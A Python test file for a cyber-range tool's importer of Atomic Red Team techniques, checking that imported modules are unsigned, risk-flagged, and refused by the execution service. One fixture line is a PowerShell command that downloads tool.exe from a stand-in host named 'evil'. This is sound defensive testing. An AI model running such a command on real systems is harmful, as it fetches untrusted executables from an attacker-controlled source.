"""The external-content importer (scripts/import_atomics.py).

Verifies the conversion contract and - the point of the whole tool - that
imported modules arrive unsigned and the service refuses to run them.
"""

import importlib.util
import json
import pathlib
import tempfile
import unittest

from cyberrange import catalog
from cyberrange.db import Database
from cyberrange.rbac import AuthorizationError  # noqa: F401 - imported for parity
from cyberrange.service import CyberRangeService, ServiceError

# Load the importer module by path (it lives under scripts/, not the package).
_IMPORTER = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "import_atomics.py"
_spec = importlib.util.spec_from_file_location("import_atomics", _IMPORTER)
imp = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(imp)

HAS_YAML = importlib.util.find_spec("yaml") is not None

# A Linux shell atomic (should become real-capable) and a Windows PowerShell one
# (should be recorded but left to simulate), plus a risky download command.
SAMPLE_ATOMIC = """
attack_technique: T1059.004
display_name: Unix Shell
atomic_tests:
  - name: Harmless echo
    auto_generated_guid: 11111111-1111-1111-1111-111111111111
    supported_platforms:
      - linux
    input_arguments:
      target:
        description: a host
        type: string
        default: localhost
    executor:
      name: sh
      elevation_required: false
      command: echo hello from $target
      cleanup_command: echo done
  - name: Download a tool
    supported_platforms:
      - windows
    executor:
      name: powershell
      elevation_required: true
      command: Invoke-WebRequest -Uri http://evil/tool.exe -OutFile tool.exe
"""


@unittest.skipUnless(HAS_YAML, "PyYAML not installed")
class ImportAtomicTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        d = pathlib.Path(self.tmp.name) / "T1059.004"
        d.mkdir(parents=True)
        (d / "T1059.004.yaml").write_text(SAMPLE_ATOMIC)
        self.mods = imp.import_atomic(pathlib.Path(self.tmp.name), limit=100)

    def tearDown(self):
        self.tmp.cleanup()

    def test_both_tests_imported(self):
        self.assertEqual(len(self.mods), 2)

    def test_everything_is_unsigned(self):
        self.assertTrue(all(m["signed"] is False for m in self.mods))

    def test_technique_is_base_level(self):
        # sub-technique collapsed to parent so it matches the tactic/detection tables
        self.assertEqual(self.mods[0]["technique_ids"], ["T1059"])
        self.assertEqual(self.mods[0]["_import"]["attack_technique"], "T1059.004")

    def test_linux_shell_gets_a_real_execution_spec(self):
        linux = next(m for m in self.mods if m["platform"] == "linux")
        self.assertIn("execution", linux)
        self.assertEqual(linux["execution"]["cmd"], ["sh", "-c", "echo hello from $target"])
        self.assertEqual(linux["inputs"], {"target": "string"})
        self.assertEqual(linux["cleanup"], "echo done")

    def test_windows_powershell_is_recorded_not_runnable(self):
        win = next(m for m in self.mods if m["platform"] == "windows")
        self.assertNotIn("execution", win)  # no spec -> simulates
        self.assertIn("candidate_command", win["_import"])

    def test_risk_flags_detected(self):
        win = next(m for m in self.mods if m["platform"] == "windows")
        self.assertIn("download", win["_import"]["risk_flags"])
        # elevation + risk -> proposed S2
        self.assertEqual(win["safety_class"], "S2")


@unittest.skipUnless(HAS_YAML, "PyYAML not installed")
class ImportedModulesAreNotExecutableTest(unittest.TestCase):
    """The safety contract: catalog may list an imported module, but the service
    must refuse to execute it because it is unsigned."""

    def setUp(self):
        self.svc = CyberRangeService(Database(":memory:"))
        # Inject an unsigned imported-style module into the catalog cache.
        self._orig = catalog._staged_modules
        staged = imp._module(
            mod_id="CR-ATOMIC-TEST-00", name="unsigned import", technique="T1059",
            platform="linux", executor_name="sh", command="echo x",
            cleanup="", inputs={}, elevation=False, source="atomic-red-team", extra={})
        catalog._staged_modules = lambda: [staged]
        catalog.get_module.cache_clear() if hasattr(catalog.get_module, "cache_clear") else None

    def tearDown(self):
        catalog._staged_modules = self._orig

    def test_service_refuses_unsigned_import(self):
        rng = self.svc.create_range("inst", "instructor", "CR-PHISH-001")
        for a in ("preflight", "provision", "seed", "ready"):
            self.svc.lifecycle_action("inst", "instructor", rng["id"], a)
        ex = self.svc.start_exercise("inst", "instructor", rng["id"])
        with self.assertRaises(ServiceError) as ctx:
            self.svc.execute_module("inst", "instructor", ex["id"], "CR-ATOMIC-TEST-00")
        self.assertIn("unsigned", str(ctx.exception).lower())


if __name__ == "__main__":
    unittest.main()
